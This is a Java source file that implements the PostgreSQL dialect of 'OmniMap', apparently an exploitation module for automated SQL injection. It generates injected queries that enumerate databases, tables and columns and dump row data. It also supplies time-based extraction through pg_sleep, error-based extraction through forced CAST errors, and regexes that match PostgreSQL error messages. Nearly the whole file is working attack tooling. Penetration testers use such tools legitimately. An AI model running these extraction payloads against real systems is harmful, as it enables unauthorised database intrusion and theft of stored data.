package com.omnistrike.modules.exploit.omnimap.dbms;

import java.util.List;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

/**
 * PostgreSQL dialect for OmniMap.
 * Uses information_schema, SUBSTRING(), CHR(), pg_sleep(), CASE WHEN for conditionals,
 * and CAST type-conversion errors for error-based extraction.
 */
public class PostgresDialect implements DbmsDialect {

    @Override
    public String getName() { return "PostgreSQL"; }

    @Override
    public String currentDatabase() {
        return "SELECT current_database()";
    }

    @Override
    public String listDatabases() {
        return "SELECT datname FROM pg_database WHERE datistemplate=false";
    }

    @Override
    public String listTables(String database) {
        return "SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_catalog='" + database + "'";
    }

    @Override
    public String listColumns(String database, String table) {
        return "SELECT column_name FROM information_schema.columns WHERE table_catalog='" + database
                + "' AND table_name='" + table + "'";
    }

    @Override
    public String dumpData(String database, String table, List<String> columns, int offset, int limit) {
        String cols = columns.stream()
                .map(c -> "COALESCE(CAST(\"" + c + "\" AS TEXT),CHR(32))")
                .collect(Collectors.joining("||CHR(124)||"));
        return "SELECT " + cols + " FROM \"" + table + "\" LIMIT " + limit + " OFFSET " + offset;
    }

    @Override
    public String charFunction(int ascii) {
        return "CHR(" + ascii + ")";
    }

    @Override
    public String substringFunction(String expr, int pos, int len) {
        return "SUBSTRING((" + expr + ")," + pos + "," + len + ")";
    }

    @Override
    public String lengthFunction(String expr) {
        return "LENGTH((" + expr + "))";
    }

    @Override
    public String sleepFunction(int seconds) {
        return "pg_sleep(" + seconds + ")";
    }

    @Override
    public String ifFunction(String condition, String trueVal, String falseVal) {
        return "CASE WHEN (" + condition + ") THEN " + trueVal + " ELSE " + falseVal + " END";
    }

    @Override
    public String commentSuffix() {
        return "--";
    }

    @Override
    public String concatenate(String... parts) {
        return String.join("||", parts);
    }

    @Override
    public List<String> errorFunctions() {
        return List.of(
                "CAST((%s) AS INT)",
                "1/(CASE WHEN (1=1) THEN CAST((%s) AS INT) ELSE 1 END)"
        );
    }

    @Override
    public List<Pattern> errorPatterns() {
        return List.of(
                Pattern.compile("PSQLException", Pattern.CASE_INSENSITIVE),
                Pattern.compile("org\\.postgresql\\.util", Pattern.CASE_INSENSITIVE),
                Pattern.compile("ERROR:\\s+syntax error at or near", Pattern.CASE_INSENSITIVE),
                Pattern.compile("invalid input syntax for (type )?integer", Pattern.CASE_INSENSITIVE),
                Pattern.compile("current transaction is aborted", Pattern.CASE_INSENSITIVE),
                Pattern.compile("unterminated quoted string", Pattern.CASE_INSENSITIVE)
        );
    }

    @Override
    public String countRows(String database, String table) {
        return "SELECT COUNT(*) FROM \"" + table + "\"";
    }

    @Override
    public String separator() {
        return "CHR(124)";
    }
}
